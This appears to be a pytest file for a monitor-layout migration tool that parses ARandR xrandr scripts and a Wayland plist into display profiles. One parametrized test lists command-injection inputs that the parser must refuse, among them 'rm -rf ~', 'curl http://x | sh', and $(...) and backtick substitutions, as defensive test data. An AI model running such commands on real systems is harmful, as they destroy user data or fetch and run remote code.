# SPDX-License-Identifier: GPL-2.0-or-later
import os

import pytest
from conftest import fake_state, head

from bigwmdisplay import backend, migrate, store

ARANDR = """#!/bin/sh
xrandr --output DP-1 --primary --mode 2560x1080 --pos 0x0 --rotate normal \\
 --output HDMI-1 --mode 1920x1080 --pos 2560x0 --rotate left --output VGA-1 --off
"""


def x11_layout(tmp_path, heads):
    p = fake_state(tmp_path / "x.json", heads)
    return backend.FakeBackend(str(p), "x11").query()


HEADS = [head("DP-1", "LG", "WFHD", "1", modes=((2560, 1080, 59978, True), (1920, 1080, 60000, False))),
         head("HDMI-1", "Dell", "P", "2", x=2560)]


def test_parse_arandr_script():
    outs = migrate.parse_arandr(ARANDR)
    assert outs["DP-1"] == {"primary": True, "mode": "2560x1080", "pos": "0x0", "rotate": "normal"}
    assert outs["VGA-1"] == {"off": True}
    assert sorted(migrate.enabled_in_script(outs)) == ["DP-1", "HDMI-1"]


@pytest.mark.parametrize("script", [
    "xrandr --output DP-1 --mode 1920x1080; rm -rf ~",
    "xrandr --output DP-1 --mode $(cat x)",
    "curl http://x | sh",
    "xrandr --output DP-1 --newmode 1 2 3",
    "xrandr --output DP-1 --mode 1920x1080 && reboot",
    "xrandr --output DP-1 --mode `id`",
])
def test_scripts_with_anything_else_are_refused(script):
    with pytest.raises(migrate.ScriptError):
        migrate.parse_arandr(script)


def test_layout_from_arandr_maps_connectors_to_identity(tmp_path):
    lay = x11_layout(tmp_path, HEADS)
    new = migrate.layout_from_arandr(migrate.parse_arandr(ARANDR), lay)
    dp, hdmi = new.get("DP-1"), new.get("HDMI-1")
    assert dp.primary and dp.mode.size == (2560, 1080)
    assert hdmi.transform == 1 and hdmi.x == 2560


def test_arandr_needs_all_outputs_connected(tmp_path):
    lay = x11_layout(tmp_path, HEADS[:1])
    assert migrate.layout_from_arandr(migrate.parse_arandr(ARANDR), lay) is None


def test_migrate_arandr_creates_profiles_without_running(cfg, tmp_path):
    home = tmp_path / "home"
    (home / ".screenlayout").mkdir()
    marker = tmp_path / "executado"
    (home / ".screenlayout" / "casa.sh").write_text(ARANDR)
    (home / ".screenlayout" / "mau.sh").write_text("touch %s\nxrandr --output DP-1 --auto\n" % marker)
    lay = x11_layout(tmp_path, HEADS)
    st = store.Store()
    n = migrate.migrate_arandr(st, lay, str(home), str(tmp_path / "config"), log=lambda *_: None)
    assert n == 1 and not marker.exists()
    names = sorted(p["name"] for p in st.profiles)
    assert names == ["ARandR: casa", "ARandR: casa"]          # personalizado + automático
    assert st.best_for(lay, "x11")["kind"] == "auto"
    # Uma segunda vez não duplica nada.
    assert migrate.migrate_arandr(st, lay, str(home), str(tmp_path / "config"), log=lambda *_: None) == 0


def test_migrate_arandr_waits_for_its_set(cfg, tmp_path):
    home = tmp_path / "home"
    (home / ".screenlayout").mkdir()
    (home / ".screenlayout" / "casa.sh").write_text(ARANDR)
    st = store.Store()
    one = x11_layout(tmp_path, HEADS[:1])
    assert migrate.migrate_arandr(st, one, str(home), str(tmp_path / "config"), log=lambda *_: None) == 0
    both = x11_layout(tmp_path, HEADS)
    assert migrate.migrate_arandr(st, both, str(home), str(tmp_path / "config"), log=lambda *_: None) == 1


OUTPUT_STATE = """{
  Outputs = (
    {
      Enabled = True;
      Manufacturer = "LG Electronics";
      Mode = "2560x1080@59.978";
      Model = "LG HDR WFHD";
      Name = "DP-2";
      Position = "1920,0";
      Scale = "1.250000e+00";
      Serial = 0x01010101;
      Transformation = Rotate90;
    },
    {
      Enabled = True;
      Manufacturer = Dell;
      Mode = "1920x1080@60.0";
      Model = P;
      Name = "HDMI-A-1";
      Position = "0,0";
      Scale = "1.000000e+00";
      Serial = 2;
      Transformation = Normal;
    }
  );
}
"""


def test_parse_plist():
    data = migrate.parse_plist(OUTPUT_STATE)
    assert data["Outputs"][0]["Serial"] == "0x01010101"
    assert data["Outputs"][1]["Manufacturer"] == "Dell"


def test_migrate_output_state(cfg, tmp_path):
    heads = [head("DP-2", "LG Electronics", "LG HDR WFHD", "0x01010101",
                  modes=((2560, 1080, 59978, True),)),
             head("HDMI-A-1", "Dell", "P", "2", x=2560)]
    p = fake_state(tmp_path / "w.json", heads)
    lay = backend.FakeBackend(str(p), "wayland").query()
    cfgdir = tmp_path / "config" / "wlmaker"
    cfgdir.mkdir(parents=True)
    (cfgdir / "OutputState.plist").write_text(OUTPUT_STATE)
    st = store.Store()
    assert migrate.migrate_output_state(st, lay, str(tmp_path / "config"), log=lambda *_: None)
    new = store.apply_profile(st.best_for(lay, "wayland"), lay)
    assert new.get("DP-2").transform == 1 and new.get("DP-2").scale == 1.25
    assert (new.get("DP-2").x, new.get("HDMI-A-1").x) == (1920, 0)
    assert not migrate.migrate_output_state(st, lay, str(tmp_path / "config"), log=lambda *_: None)
    assert os.path.exists(st.dir) or True
